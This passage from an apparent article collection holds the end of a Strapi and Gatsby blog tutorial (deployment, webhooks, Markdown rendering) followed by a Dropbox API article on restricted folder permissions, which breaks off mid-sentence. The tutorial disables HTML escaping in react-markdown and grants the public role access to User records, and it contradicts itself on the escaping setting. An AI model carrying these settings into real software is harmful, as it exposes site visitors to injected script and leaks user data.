source plugin for Strapi APIs. Good news: we built it for you ! \nLet's install it: \nPath: blog/ \nnpm install --save gatsby-source-strapi \nThis plugin needs to be configured. Replace the content of gatsby-config.js with: \nNOTE: Please understand that the apiURL: , e.g. http://localhost:1337 does NOT have a trailing slash. This will create issues, as a slash is added by other code in the plugin. \nPath: blog/gatsby-config.js \nAllow access to User \nRemember, when we created the content type we created a relation between User and Articles. \nLike Article , User , link is likewise, by default, restricted. But Gatsby needs access, so to allow access, visit the Auth and Permissions section for Public role , click on Public , select the User - find action and save. After saving; Gatsby will have access to all the necessary content types managed by Strapi (for this tutorial). \nRestart Strapi from the command line, inside the cms folder - first by Ctrl + C to stop the server; and then typing strapi develop , to restart it. \nNext, restart the Strapi server to allow Gatsby to register these updates, the next time you restart Gatsby. \nOptional: Modify the <Layout /> component. Add Strapi to the footer. \nReplace the following <footer> section. \nPath: blog/src/components/layout.js \n<footer> \u00a9 {new Date().getFullYear()}, Built with {` `} <a href=\"https://www.gatsbyjs.org\">Gatsby</a> and {\" \"} <a href=\"http://strapi.io\">Strapi</a> </footer> \n6. Create our Index Page \nVIDEO \nImportant links from Video: \nArticles list \nFirst, we want to display the list of articles. To do so, add the following content in the existing home page file: \nPath: blog/src/pages/index.js \nWhat are we doing here? \nAt the end of the file, we export pageQuery , a GraphQL query which requests the entire list of articles. As you can see, we require only the id , title and content fields, thanks to the precise GraphQL query language. \nThen, we pass the { data } destructured object as parameter of IndexPage and loop on its allStrapiArticle object to display the data. \nTip: generate your GraphQL query in seconds! \nGatsby includes a useful GraphiQL interface. It makes GraphQL queries development way easier and intuitive. Take look at it and try to create some queries. \nAdding images \nTo add images, we will need to import Img from package gatsby-image installed by default. Replace the content of blog/src/pages/index.js with the following : \nPath: blog/src/pages/index.js \n7. Create the Article page view \nVIDEO \nImportant links from Video: \nArticle view \nOur website now starts looking like a blog which is a good thing. However, an important part is still missing: the article\u2019s details page. \nLet's create the template, containing a specific GraphQL request and defining the content displayed: \nIn order to do this, first create a folder called templates in your src directory. Then within templates create a file called article.js . \nPath: blog/src/templates/article.js \nThat looks fine, but at this point, Gatsby does not know when this template should be displayed. Each article needs a specific URL. So, we are going to inform Gatsby about the new URLs we need thanks to the createPage function . \nFirst, we are going to code a new function called makeRequest to execute the GraphQL request. Then, we export a function named createPages in which we get the list of articles and create a page for each of them. Here is the result: \nPath: blog/gatsby-node.js \nRestart the Gatsby server. \nFrom now on, you should be able to visit the detail page by clicking on URLs displayed on the homepage. \n8. Gatsby Images and author page \nVIDEO \nImportant links from Video: \nFluid Images \nNote: In the video, the maxWidth attribute of the image (in the graphql variable) was set to 500 . However, this should have been set to 960 , which matches the max-width of the enclosing container div. \nGive your header image a fluid/responsive image. \nPath: blog/src/templates/article.js \nA. Edit the query variable export to match: \nexport const query = graphql` query ArticleTemplate($id: String!) { strapiArticle(id: { eq: $id }) { title content image { childImageSharp { fluid(maxWidth: 960) { ...GatsbyImageSharpFluid } } } author { id username } } } ` \nB. Edit the <Img /> component tag as follows: \n<Img fluid={data.strapiArticle.image.childImageSharp.fluid} /> \nAuthor view \nArticles are written by authors. They deserve a dedicated page. \nThe processes for creating author views and article pages are very similar. First, create a new file in our templates folder called, author.js . Add the code below to this file. \nPath: blog/src/templates/author.js \nSecond, we update the gatsby-node.js file to create the URLs (with the below code): \nPath: blog/gatsby-node.js \nFinally, restart the server and visit the author page from the article view's links. \n8B. Specify Node Version \nVIDEO \nImportant links from Video: \nOn April 23, 2019 Node v12.0.0 was released. There is an incompatibility or bug that is present regarding SQLite. \nTherefore, make the following change to your package.json file found in your Strapi project root: \nPath: cms/package.json \nChange the engines object from: \n\"engines\": { \"node\": \">= 10.0.0\", \"npm\": \">= 6.0.0\" }, \nTo: \n\"engines\": { \"node\": \"10.x\", \"npm\": \">= 6.0.0\" }, \nAfter changing your file and saving it, you may simply continue to the next section. \n9. Deploy to Heroku \nVIDEO \nImportant links from Video: \nWe will deploy Strapi to Heroku. You will need a free account with Heroku . \nNext install the Heroku CLI . \nThese commands are to login to Heroku and to create a new Strapi Project . \nPath: ./ \nheroku login \nEdit .gitignore file \nOpen your editor and add package-lock.json to the .gitignore file. \nPath: cms/.gitignore \n############################ # Strapi Heroku ############################ package-lock.json \nNext, you will need to init Git and commit your project \ncd cms git init git add . git commit -m \"Initial Commit\" \nCreate a Heroku Project. \nheroku create \nYou NEED TO set-up a database to work with Strapi. Here are step-by-step instructions to set-up a PostgreSQL or a MongoDB database. Follow the steps in the links, and then continue below. \nLastly, commit , push to heroku , and open your project. \ngit commit -am \"Update database config\" git push heroku master heroku open \nIf your browser window open at the Heroku URL, congratulations. If not, please review the documentation and the video for additional details. \nSet-up Administrator and User Roles \nYour browser should have opened back up to the Strapi Welcome page. Click on the /admin link to enter the Administrator User . \nComplete the form for the first Administrator User . \nClick on Users located under CONTENT TYPES in the left-hand menu. \nClick the blue + Add New User button in the top right corner. \nNext, complete the Username , Email , and Password fields. \nSelect ON for the Confirmed toggle field. \nTo the right, under Role , select Authenticated . \nConfigure the WYSIWYG Editor View \nWhen you locally created the Article content, you checked WSYISWG as a setting for the content field. When you created a new install for Heroku with PostreSQL, you lost these settings. You will now reset these settings: \n- Click on Content Manager in the left-hand menu - Then under Content Types , click on Article - Click the Edit View (Settings) tab and then under LAYOUT - Displayed Fields - click and highlight the content field. - Scroll down and toggle ON for Display as WYSIWYG \nContinue to adding content below. \nInsert some entries \nArticles now need to be added again to the Production installation of Strapi. Add some articles in the database. To do so, follow these instructions: \nFrom you Dashboard, click on the Articles content type in the left-hand menu. \nClick on Add New Article . \nInsert values, link to an author and submit the form. \nCreate two other articles. \nNote: You can download the sample content from the video here . \n9A. Configure again Permissions \nVIDEO \nYou have to allow access through the API under Roles & Permission from your Strapi Dashboard. \nYou have already set these permissions on your local Dev environment. But these settings need to be set again for Heroku as these settings are saved to a database and the Heroku PostgreSQL database is different than your local Dev environment. \nLogin to your Strapi Dashboard, from https://your-heroku-url.herokuapp.com/admin . \nGo to Roles and Permission and then click on Public . Set your Article permissions so find and findone are checked. \nWithin Roles and Permissions and Public , scroll to and click on USERS-PERMISSIONS , and set User permissions find to checked. \nYou have now allowed access through the API to Articles , Article and Users . \n10. Set-up Cloudinary & Netlify Predeploy \nVIDEO \nImportant links from Video: \nDEMO Urls: \nAPI demos: \nAt this point, when you upload images to Strapi on Heroku, the images are not permanently saved. The reason is because they are saved to a temporary cache which gets deleted whenever Heroku goes to sleep. \nTherefore, you will want to use a 3rd party service to upload to and then serve your images from. This tutorial continues with Cloudinary . \nNext, install the plugin with npm, commit and push your changes to Heroku: \nPath: ./cms \nnpm i --save strapi-provider-upload-cloudinary git add . git commit -m \"Installed Cloudinary Plugin\" git push heroku master \nWait for Heroku to install the packages and to restart the server instance. \nFrom your Cloudinary console, you will find your Cloudinary credentials to enter in Strapi: \nFrom the Strapi Dashboard, click on Plugins and then for FILES UPLOAD click the cog icon. \nSelect Cloudinary in the Providers dropdown and enter in your credentials: \nCloud name \nAPI Key \nAPI Secret \nThen save your changes in the Upload - Settings . \nDelete from Files Upload the references to previously uploaded images. \nNow, for each content-type containing images, upload again the images that corresponds to your existing content: \nFrom now on, new content will automatically have their images saved and served from Cloudinary. \n11. Deploy Gatsby to Netlify \nVIDEO \nImportant links from Video: \nYou are going to need to prepare a few things: \nNext, the Gatsby part of your project, needs to be pushed to your new GitHub repo: \nPath: ./blog/ \ngit init git add . git commit -m \"first commit\" git remote add origin git@github.com:YOUR-NAME/YOUR-NEW-EMPTY-REPO.git git push -u origin master \nAfter setting up your Gatsby site on GitHub for deployment to Netlify, we need to edit the gatsby-config.js . \nLocate gatsby-source-strapi plugin object and replace it with the following code: \nPath: ./blog/gatsby-config.js \n{ resolve: `gatsby-source-strapi`, options: { apiURL: process.env.DEPLOY_URL ? \"https://YOUR-APP-URL.herokuapp.com\" : \"http://localhost:1337\", contentTypes: [`article`, `user`], queryLimit: 1000, }, }, \nOpen your .gitignore file and add package-lock.json to the ignore list. \nPath: ./.gitignore \n... # Yarn yarn-error.log .pnp/ .pnp.js # Yarn Integrity file .yarn-integrity package-lock.json \nNext, you need to git add , git commit and git push your new changes. From your command line: \nPath: ./blog/ \ngit add . git commit -m \"Update config-gatsby.js and .gitignore file\" git push \nIn order to easily push your Gatsby site to Netlify, you have to install and login to Netlify using the Netlify CLI : \nFrom your command line: \nnpm install netlify-cli -g netlify login \nPress the Authorize button and close the tab or window. \nNetlify is now set-up on your computer. It's time to initialize your project (Please pay close attention to the build command and directory ): \nPath: ./blog/ \nnetlify init ? What would you like to do? + Create & configure a new site ? Site name (optional): ? Team: YOUR NAME HERE Site Created Admin url: https://app.netlify.com/sites/SITE-NAME Site url: https://SITE-NAME.netlify.com Site ID: YOUR-UNIQUE-SITE-ID ? Your build command (hugo/yarn run build/etc): gatsby build ? Directory to deploy (blank for current dir): public ? No netlify.toml detected. Would you like to create one with these build settings? Yes Creating Netlify Github Notification Hooks... Netlify Notification Hooks configured! Netlify CI/CD Configured! The site is now configured to automatically deploy from github branches & pull requests Next steps: git push Push to your git repository to trigger new site builds netlify open Open the Netlify adlin URL of your site \nA last git add , git commit and git push are needed in order to finish the connection between your github and Netlify. Then open your Netlify Deployment Console . \nFrom your command line: \nPath: ./blog/ \ngit add . git commit -m \"netlify config settings files\" git push netlify open \nAfter Netlify finishes deploying your site, you can click the green site link to see it. \n12. Webhooks with Gatsby & Strapi \nVIDEO \nImportant links from Video: \nCreate and Copy a Netlify WebHook URL \nLogin into your Netlify Login \nFrom your App, go to: Settings -> Build & deploy -> Continuous deployment -> Build hooks \nClick Add build hook \nGive your app a build hook name , e.g. strapiUpdate \nSave it and then copy the issued URL to the clipboard. \nAdd a Variable to your custom.json file \nYou will need to create a variable for the webhook. We will use this variable to update any content-type and their models. If the webhook changes, you will only need to change this variable. \nPath: ./cms/config/environments/production/custom.json \nAdd the following line: \n\"staticWebsiteBuildURL\": \"https://api.netlify.com/build_hooks/5cc30b_YOUR_CUSTOM_URL_2a83\" \nAnd it should look like this after: \n{ \"myCustomConfiguration\": \"This configuration is accessible through strapi.config.environments.production.myCustomConfiguration\", \"staticWebsiteBuildURL\": \"https://api.netlify.com/build_hooks/5cc30b_YOUR_CUSTOM_URL_2a83\" } \nModify the model for the Article Content Type \nThe following is the new Article.js file. This file now has additional code that use the variable withe the netlify webhook. Whenever this Content Type is creates a new instance, updates one or deletes one of the content types, it will fire a Post request to Netlify using the Webhook URL. \nPath: ./cms/api/article/models/Article.js \n'use strict'; const axios = require('axios'); /** * Lifecycle callbacks for the `Article` model. */ module.exports = { // Before saving a value. // Fired before an `insert` or `update` query. // beforeSave: async (model, attrs, options) => {}, // After saving a value. // Fired after an `insert` or `update` query. // afterSave: async (model, response, options) => {}, // Before fetching a value. // Fired before a `fetch` operation. // beforeFetch: async (model, columns, options) => {}, // After fetching a value. // Fired after a `fetch` operation. // afterFetch: async (model, response, options) => {}, // Before fetching all values. // Fired before a `fetchAll` operation. // beforeFetchAll: async (model, columns, options) => {}, // After fetching all values. // Fired after a `fetchAll` operation. // afterFetchAll: async (model, response, options) => {}, // Before creating a value. // Fired before an `insert` query. // beforeCreate: async (model, attrs, options) => {}, // After creating a value. // Fired after an `insert` query. // afterCreate: async (model, attrs, options) => { afterCreate: async entry => { axios .post(strapi.config.currentEnvironment.staticWebsiteBuildURL, {}) .catch(() => { // Ignore }); }, // Before updating a value. // Fired before an `update` query. // beforeUpdate: async (model, attrs, options) => {}, // After updating a value. // Fired after an `update` query. // afterUpdate: async (model, attrs, options) => { afterUpdate: async entry => { axios .post(strapi.config.currentEnvironment.staticWebsiteBuildURL, {}) .catch(() => { // Ignore }); }, // Before destroying a value. // Fired before a `delete` query. // beforeDestroy: async (model, attrs, options) => {}, // After destroying a value. // Fired after a `delete` query. // afterDestroy: async (model, attrs, options) => { afterDestroy: async entry => { axios .post(strapi.config.currentEnvironment.staticWebsiteBuildURL, {}) .catch(() => { // Ignore }); }, }; \nInstall Axios \nYour new code changes require the installation of an npm package called, axios . \nFrom you command line: \nPath: ./cms \nnpm i axios --save \nCommit and Push to Heroku and Update Netlify \nYou will now need to add , commit and push your changes in the project. These changes were made in the Strapi files. Doing this will automatically fire a Post request to Netlify, which will update Netlify automatically. \nFrom your command line: \nPath: ./cms/ \ngit add . git commit -m \u201cadded webhook for netlify\u201d heroku login git push heroku master \nWebhooks configured \nAfter Netlify has had a moment to issue the command to rebuild and has done so, you will be able to login into your Heroku based Strapi project and make updates which automatically update Netlify. \nAdditional Content Types \nIn this example tutorial we created one Content Type called, article . You will need to update the model file (as above) for every additional Content Type you create for your project AND which should trigger a Gatsby rebuild . \n13. Adding Markdown Support \nVIDEO \nImportant links from Video: \nAdding Markdown Support \nThe next steps involve adding Markdown support to the Gatsby build. In this way, your content from Strapi will properly transform from Markdown to HTML. \nIn this example, the tutorial article, \" Bed and breakfasts Give a Personal Touch \", the main content area is not properly formatted. \nAt the end of this section, the content will properly transform Markdown to HTML. You can see the final transformation here . \nA React package called React Markdown needs to be installed in order properly parse the Markdown and transform it to HTML. \nInstall React Markdown \nThe package repo can be found at React Markdown . \nFrom your command line: \nPath: ./blog/ \nnpm install --save react-markdown \nUse React Markdown in a Component \nNext, several steps need to occur. These steps include importing the package into each of the index.js , article.js and author.js template pages. And then, adding the React component. \nThe import statement looks like this: \nimport ReactMarkdown from \"react-markdown\" \nAnd the ReactComponent for the article.js file looks like this: \n<ReactMarkdown source={document.node.content} /> \nNote: The source option from react-markdown is simply accepting the content from the graphQL query. You will need to also delete <p>{document.node.content}</p> from the markup. \nPath: ./blog/src/templates/article.js \nThe complete article.js code looks like this at this point: \nimport React from \"react\" import { Link, graphql } from \"gatsby\" import Img from \"gatsby-image\" import Layout from \"../components/layout\" import ReactMarkdown from \"react-markdown\" const ArticleTemplate = ({ data }) => ( <Layout> <h1>{data.strapiArticle.title}</h1> <p> by{\" \"} <Link to={`/authors/User_${data.strapiArticle.author.id}`}> {data.strapiArticle.author.username} </Link> </p> <Img fluid={data.strapiArticle.image.childImageSharp.fluid} /> <ReactMarkdown source={data.strapiArticle.content} /> </Layout> ) export default ArticleTemplate export const query = graphql` query ArticleTemplate($id: String!) { strapiArticle(id: { eq: $id }) { title content image { childImageSharp { fluid(maxWidth: 960) { ...GatsbyImageSharpFluid } } } author { id username } } } ` \nYou have to repeat these steps for the index.js and author.js . \nNote: There source option is different as each of these templates are querying the data differently than the article.js file. \nPath: ./blog/src/templates/author.js \nThe complete author.js code looks like this at this point: \nNote: You will need to also delete <p>{article.content}</p> from the markup. \nimport React from \"react\" import { Link, graphql } from \"gatsby\" import Layout from \"../components/layout\" import ReactMarkdown from \"react-markdown\" const UserTemplate = ({ data }) => ( <Layout> <h1>{data.strapiUser.username}</h1> <ul> {data.strapiUser.articles.map(article => ( <li key={article.id}> <h2> <Link to={`/Article_${article.id}`}>{article.title}</Link> </h2> <ReactMarkdown source={article.content} /> </li> ))} </ul> </Layout> ) export default UserTemplate export const query = graphql` query UserTemplate($id: String!) { strapiUser(id: { eq: $id }) { id username articles { id title content } } } ` \nPath: ./blog/src/pages/index.js \nThe complete index.js code looks like this at this point: \nNote: You will need to also delete <p>{document.node.content}</p> from the markup. \nimport React from \"react\" import { Link, graphql } from \"gatsby\" import Img from \"gatsby-image\" import Layout from \"../components/layout\" import ReactMarkdown from \"react-markdown\" const IndexPage = ({ data }) => ( <Layout> <h1>Hi people</h1> <p>Welcome to your new Gatsby site.</p> <p>Now go build something great.</p> <ul> {data.allStrapiArticle.edges.map(document => ( <li key={document.node.id}> <h2> <Link to={`/${document.node.id}`}>{document.node.title}</Link> </h2> <Img fixed={document.node.image.childImageSharp.fixed} /> <ReactMarkdown source={document.node.content} /> </li> ))} </ul> <Link to=\"/page-2/\">Go to page 2</Link> </Layout> ) export default IndexPage export const pageQuery = graphql` query IndexQuery { allStrapiArticle { edges { node { id image { childImageSharp { fixed(width: 200, height: 125) { ...GatsbyImageSharpFixed } } } title content } } } } ` \nIf you take a look at your project, you will see that the Markdown is now properly transforming into HTML. However, still missing is the ability to parse images from within the content. \nUse Images with your Content \nStrapi easily saves your images to whichever Provider is configured. In this tutorial, it is Cloudinary . However, not all projects will use Cloudinary and in development , images are often saved to Strapi locally. Therefore, you will need to set an environment variable and instruct Gatsby how to parse the image path . \nSetting and using environment variables is a big subject. This Gatsby article does a good job explaining how Gatsby uses them. \nIn this tutorial, an environment variable is used to prepend http:localhost:1337 to the image path for image uploaded in Development ( gatsby develop ) as Strapi is saving the images locally. \nPath: ./blog/ \nIn the Gatsby project root create a file and call it .env.development . Add the following line: \nIMAGE_BASE_URL=http://localhost:1337 \nThis has created a variable called IMAGE_BASE_URL which the Reactmarkdown component will use IF the image path does not have a complete URL. \nReact-markdown has an option called, transformImageUri . This option makes the image path available for use within the component and so within its value pair, a ternary operator will be used to provide the logic and check if its a complete path or not. If it is not a complete path, the env variable will be used to create one. \nIn index.js the component now looks like this: \nPath: ./blog/src/pages/index.js \n<ReactMarkdown source={document.node.content} transformImageUri={uri => uri.startsWith('http') ? uri : `${process.env.IMAGE_BASE_URL}${uri}`} /> \nEdit the article.js and author.js and add the transformImageUri option to their <ReactMarkdown> components: \nPath: ./blog/src/templates/article.js \n<ReactMarkdown source={data.strapiArticle.content} transformImageUri={uri => uri.startsWith('http') ? uri : `${process.env.IMAGE_BASE_URL}${uri}`} /> \nPath: ./blog/src/templates/author.js \n<ReactMarkdown source={article.content} transformImageUri={uri => uri.startsWith('http') ? uri : `${process.env.IMAGE_BASE_URL}${uri}`} /> \nNOTE: This simple checks if uri starts with http , if it does then it's a complete path and if it doesn't then it is locally hosted with a relative path and the IMAGE_BASE_URL is prepended. \nNote: You can check if this works by going to Plugins > FILES UPLOAD > cog and changing the Provider back from Cloudinary to Local Provider . You will need to add back your images from within your Content Types to test this. \nYou content is now properly parsed and transforming from Markdown to HTML. The following section is an Optional section that will provide some styling (and instruction) for the index.js and author.js pages and also implement and allow the use of plain HTML within the content. \nOPTIONAL: Creating a Basic Blogroll \nThe index.js page currently displays every article . The issue is that the page displays the entire article. Normally, on this type of index page, a snippet is showed with a Read more link. \nTo accomplish this functionality various things need to be done: \nAdd a CSS class through the react-markdown package and component \nThis CSS class allows for removing the images as well as give a uniform height with CSS for the content in the index type pages. \nAdd JavaScript to omit any text after 500 characters and add ... to the end of the snippet. \nAdd a link for the Read more . \nAdd a global.css stylesheet with a few styles. \nThese changes are the same for both the index.js page and the author.js template. Edit these files like this: \nindex.js \nPath: ./blog/src/pages/index.js \n<ReactMarkdown source={document.node.content.substring(0, 500).concat(\"...\")} transformImageUri={uri => uri.startsWith('http') ? uri : `${process.env.IMAGE_BASE_URL}${uri}`} className=\"indexArticle\" /> <Link to={`/${document.node.id}`}>Read more</Link> \nauthor.js \nPath: ./blog/src/templates/author.js \n<ReactMarkdown source={article.content.substring(0, 500).concat(\"...\")} transformImageUri={uri => uri.startsWith('http') ? uri : `${process.env.IMAGE_BASE_URL}${uri}` } className=\"indexArticle\" /> <Link to={`/Article_${article.id}`}>Read more</Link> \nNOTE: Make sure the above code is within the closing li tag. \nAdd the CSS \nPath: ./blog/src/ \nCreate a folder and call it styles . \nPath: ./blog/src/styles/ \nCreate a file called global.css \nWithin the global.css file, add the following styles to provide a uniform height to each of your snippets and Read more links. The CSS will also hide any images within the content there. \nNote: The follow CSS styles target the className option above. \n.indexArticle { max-height: 250px; overflow: hidden; } .indexArticle img { display: none; } \nLink the CSS file \nIn order to use this new global.css file, you need to import it at the top of each page and template . \nFor example, for the index page , add import \"../styles/global.css \nPath: ./blog/pages/index.js \nimport React from \"react\" import { Link, graphql } from \"gatsby\" import Img from \"gatsby-image\" import Layout from \"../components/layout\" import ReactMarkdown from \"react-markdown\" import \"../styles/global.css\" \nAdd the import statement for each of the other pages you would like to have global CSS Styles for. \nOPTIONAL: Adding plain HTML support to the markdown \nYour project has index pages that show snippets and provide your users a link to read the full article. The next optional part of this section is to add HTML-in-Markdown support to your markdown. \nBy default, react-markdown escapes HTML contained with the markdown. This is done when the editing environment is not controlled and unwanted code injections are being guarded against. However, with the Strapi editor this is not a problem and there are various scenarios where supporting HTML-in-Markdown is desirable. \nIn this tutorial, the use case demonstrated is the ability to add classes to the images within the content. It is expected that your CSS will have a default size for the content images. In this case, using markdown syntax for the images is perfect. \nFor smaller, larger or floated images, for example, HTML support is needed as markdown does not natively support adding classes within the editing experience. \nThere are two steps to configure your project to allow HTML-in-Markdown : \nAdd the react-markdown option that sets the escapeHTML={false} from {true} \nAdd a few CSS classes for .small and .large CSS classes. \nSet the 'escapeHTML' option \nReact-markdown sets an option called, escapeHTML to true by default. You need to set this to true. Add the escapeHTML={false} option to your <Reactmarkdown /> component. Like this: \nFor the article.js \nPath: ./blog/src/templates/article.js \n<Reactmarkdown source={article.content.substring(0, 500).concat(\"...\")} transformImageUri={ uri => uri.startsWith(\"http\") ? uri : `${process.env.IMAGE_BASE_URL}${uri}` } className=\"articleContent\" escapeHtml={false} /> \nNOTE: Add escapeHTML={false} to the index.js and author.js files in the same way. \nAdd the classes to the CSS \nIn this tutorial, two classes are demonstrated. They are added to the global.css file. \nPath: ./blog/src/styles/global.css \n.articleContent img { display: block; margin: 0 auto; width: 400px; } .articleContent .small { width: 100%; max-width: 250px; } .articleContent .large { width: 100%; max-width: 600px; } \nThis CSS gives a standard size and centers any images added with markdown. And images can now be added with HTML directly in markdown and with the classes added. \nFor example, \n<img class=\"small\" src=\"path-to-image/gatsby.png\" alt=\"Small Gatsby Logo\" /> \nUpdate Git repo for the project to update Netlify \nNetlify makes it easy to update the project. Once you push to GitHub, Netlify will automatically rebuild the project. \nPath: ./blog/ \ngit add . git commit -m \"added markdown support\" git push \nAfter a few minutes, your Gatsby project hosted on Netlify will have its files updated and you can go to your Strapi installation on Heroku and add an article Content Type which will now use and properly display markdown. \nConclusion \nCongrats! You\u2019ve successfully built a super fast and easy-to-maintain blog! \nSince the content is managed by Strapi, the authors can write articles through a nice UI and developers only have to rebuild the Gatsby blog in order to update the content. \nWhere to go next? \nFeel free to continue this project to discover both Gatsby and Strapi advantages. Here are some features you can add: list of authors, article's categories, and comment system with the Strapi API or Disqus. You can also create other types of websites (e-commerce shop, corporate website, etc.). \nWhen your project is achieved, you will probably want to deploy it. The static website generated by Gatsby can easily be published on storage providers : Netlify, S3/Cloudfront, GitHub pages, GitLab pages, Heroku, etc. The Strapi API is a headless CMS, so it can be hosted on Heroku or any Linux instance that has Node.js installed. \nThe code source of this tutorial is available on GitHub . To see it live, clone the repository, run npm run setup , start the Strapi server ( cd cms && strapi start ) and the Gatsby server ( cd blog && gatsby develop ). \nWe hope you enjoyed this tutorial. Feel free to comment on it, share it, and let us know how you create sites built with React and how you manage their content.",

      "title": "Implementing restricted access with nested permissions and folders",
      "text": "Dropbox (and the Dropbox API) has recently expanded the flexibility of our permissions model by adding the ability for Dropbox Business users to create folders that have a more restricted audience than their parent folders. This is perfect for cases where you want a sub-folder to have a smaller audience* than its parent folder. \n*Note: this article is focused on restricted access use cases, but it is possible to create sub-folders that have more shares than a parent folder. \nIn this article, we\u2019ll cover details of what it means to restrict folder permissions, how to edit those permissions using the Dropbox API, and run through some common use cases. \nWhat does it mean for a folder to have restricted access? \nBy default, new shared folders inside a team folder inherit their share settings. However, folders with restricted access do not inherit member access from their parent folder, and can instead be set to a more limited audience. Once the inheritance has been broken, you can add specific individual members or groups to customize who has access (and at what level) to the specific sub-folder. These types of restricted folders can only be created inside team folders. \nNote: the \u201cDropbox Web\u201d instructions in this article are meant to help follow along, but are subject to change. For official instructions please refer to the restrict folder access help center article . \nHow do I restrict access to a folder? \nNew Folder \nDropbox Web : Inside a team folder, click on \u201cNew folder\u201d from the web page, and select the \u201cSpecific people\u201d option from the subsequent modal pop up. \nDropbox API : Using the /sharing/share_folder endpoint you can designate a path and name for the new folder (one will be created if the path is not found). Setting access_inheritance to no_inherit will ensure the resulting folder is created without any inherited permissions. You can then customize who has access to the folder with /sharing/add_folder_member, which accepts a dropbox_id for an account, team member, or a group. \nExisting Folders \nDropbox Web : From the sharing modal you can restrict access by removing the inherited members of the parent folder. You can either remove all* the inherited members of the parent folder at once, or remove one inherited user/group at a time. \nDropbox API : Use the /sharing/set_access_inheritance endpoint to pass in the shared_folder_id and no_inherit for the access_inheritance parameter. Once executed, this breaks the inherited permissions from the parent folder and removes all* current groups and individuals with access to the folder. From here you can assign a custom permission set by calling sharing/add_folder_member and adding specific groups or people. \n*Currently you cannot remove inherited members from an existing folder with 100+ members. \nHow do I restore parent folder members? \nDropbox Web : Inherited members can be restored by clicking on \u201cshare with members\u201d in the gray banner. Once parent folder members are restored, the folder no longer has restricted access. \nDropbox API : Executing the sharing/set_access_inheritance endpoint with the shared_folder_id and and passing the setting inherit will restore all inherited parent folder members. \nUse Cases \nNow that we have a good overview of how nested permissions and restricted folders work, let\u2019s dive into an implementation scenario with the Dropbox API. \nImagine you\u2019re an admin for a media company. You\u2019re setting up a secret new project folder for one of your existing clients. Because the client\u2019s product launch is highly-confidential, only certain members of the existing client team will be working on this new project. You want to make sure all client assets are organized under the right hierarchy but want to limit who has access to the specific project folder to keep the launch under wraps. Fortunately, restricted folder permissions allow you to do exactly that. \nCreating your folder \nCreate the project folder underneath the client folder and restrict permissions using the /sharing/share_folder endpoint. \ncurl -X POST https://api.dropboxapi.com/2/sharing/share_folder \\ --header \"Authorization: Bearer <team_file_access_token> \" \\ --header \"Content-Type: application/json\" \\ --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\ --data \"{\\\"path\\\": \\\"/Client X/Secret Project Folder\\\", \\\"acl_update_policy\\\": \\\"editors\\\", \\\"force_async\\\": false, \\\"member_policy\\\": \\\"team\\\", \\\"shared_link_policy\\\": \\\"members\\\", \\\"access_inheritance\\\": \\\"no_inherit\\\"}\" \nWhile you also have more granular options for setting folder policies, setting access_inheritance to no_inherit in this context will create a folder with restricted access that does not mirror parent permissions. Providing a path that does not already exist will create the folder specified, otherwise it will create a new share for the existing path and return a shared_folder_id . \nSetting permissions \nNext we want to grant access to the secret project folder for a specific client team (already set up as a Dropbox Group ). First, let\u2019s grab the shared_folder_id from the return of the above call or using /files/get_metadata . From here you can pass in the shared_folder_id and specify a dropbox_id to grant access to a specific group of team members with the /sharing/add_folder_member endpoint. In this example, the secret client team has already been added to a group, and we\u2019re adding that group to the folder with the group\u2019s dropbox_id . Although we\u2019re adding a group in this call, a dropbox_id could belong to a Dropbox account, individual team member, or a group. \ncurl -X POST https://api.dropboxapi.com/2/sharing/add_folder_member \\ --header \"Authorization: Bearer <team_file_access_token>\" \\ --header \"Content-Type: application/json\" \\ --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\ --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\", \\\"members\\\": [{\\\"member\\\": {\\\".tag\\\": \\\"dropbox_id\\\", \\\"dropbox_id\\\": \\\"g:76264835542b7610000000000000219e\\\"}, \\\"access_level\\\": \\\"editor\\\"}], \\\"quiet\\\": true}\" \nAdjusting permissions \nOh no! You accidentally added the wrong members to your restricted folder. No worries, first let\u2019s look at all the current folder members with /sharing/list_folder_members . Then we can decide what groups or members to remove. \ncurl -X POST https://api.dropboxapi.com/2/sharing/list_folder_members \\ --header \"Authorization: Bearer <team_file_access_token>\" \\ --header \"Content-Type: application/json\" \\ --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\ --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\", \\\"actions\\\": []}\" \nOnce you\u2019ve identified the group or member you want to remove, from the response of the /sharing/list_folder_members call, you can go ahead and use /sharing/remove_folder_member . Make sure to pass in the relevant dropbox_id of members (or groups) that you want to remove and the shared_folder_id for the target folder. \ncurl -X POST https://api.dropboxapi.com/2/sharing/remove_folder_member \\ --header \"Authorization: Bearer <team_file_access_token>\" \\ --header \"Content-Type: application/json\" \\ --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\ --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\", \\\"member\\\": {\\\".tag\\\": \\\"dropbox_id\\\", \\\"dropbox_id\\\": \\\"g:76264835542b7610000000000000219e\\\"}, \\\"leave_a_copy\\\": false}\" \nRestoring permissions \nGreat, now the project team has had time to successfully execute their project in secret. They\u2019ve delivered the project, the client loved it, the product was launched, and now you want to restore the default permissions so the rest of the client team can leverage the great work they did! You can do this by calling /sharing/set_access_inheritance and passing in inherit . This will revert permissions back to the defaults of the parent folder. \ncurl -X POST https://api.dropboxapi.com/2/sharing/set_access_inheritance \\ --header \"Authorization: Bearer <team_file_access_token>\" \\ --header \"Content-Type: application/json\" \\ --header \"Dropbox-API-Select-Admin: dbmid:AACf3TCu4HhXLhlYmfbrWnV3AvkQ-0oxCLp\" \\ --data \"{\\\"shared_folder_id\\\": \\\"6448417792\\\", \\\"access_inheritance\\\": \\\"inherit\\\"}\" \nCommon Questions \nWho can restrict access to a folder? \nAny member of the team can restrict access to a folder, as long as they have the ability to manage membership of that folder. \nWhat error messages do users see when accessing a restricted folder? \nHow is this feature visible in Dropbox? \nIcon Meaning A user who does not have access to a folder in a team folder will see this icon on all surfaces. A user who does not have access to a folder in a team folder, but is added to one or more subfolders, will see this icon on all surfaces. They can click into this folder to get to the subfolders they have access to, but they will not see other content in this folder. A user who has access to a folder within a team folder will see this icon on all surfaces. \nBest practices for large deployments \nAvoid creating multiple folders with restricted access at the same time. Nothing will break, but you may encounter a namespace 